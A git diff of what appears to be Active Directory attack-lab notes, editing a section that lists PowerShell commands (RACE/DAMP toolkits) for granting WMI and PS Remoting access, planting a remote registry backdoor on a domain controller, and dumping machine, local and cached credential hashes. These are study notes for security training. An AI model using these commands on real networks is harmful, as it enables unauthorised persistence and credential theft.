@@ -232,7 +232,7 @@ Administrator -namespace 'root\cimv2' -Verbose
 Set-RemoteWMI -SamAccountName student1 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
 ```
 
-__PS Remoting (RACE toolkit)__  -  backdoor not stable after August 2020 patches
+__PS Remoting (RACE toolkit)__  -  backdoor, not stable after August 2020 patches
 - On local machine for student1:
 ```powershell
 Set-RemotePSRemoting -SamAccountName student1 -Verbose
@@ -243,25 +243,29 @@ Set-RemotePSRemoting -SamAccountName student1 -Verbose
 Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc 
 -Verbose
 ```
+
 - On remote machine, remove the permissions:
 ```powershell
 Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc 
 -Remove
 ```
 
-__Add Trustee (RACE/DAMP)__ - with admin privs on remote machine
+__Remote registry backdoor (RACE/DAMP)__ - with admin privs on remote machine
 
 ```powershell
 Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
 ```
+
 - As student1, retrieve machine account hash:
 ```powershell
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
 ```
+
 - Retrieve local account hash:
 ```powershell
 Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
 ```
+
 - Retrieve domain cached credentials:
 ```powershell
 Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
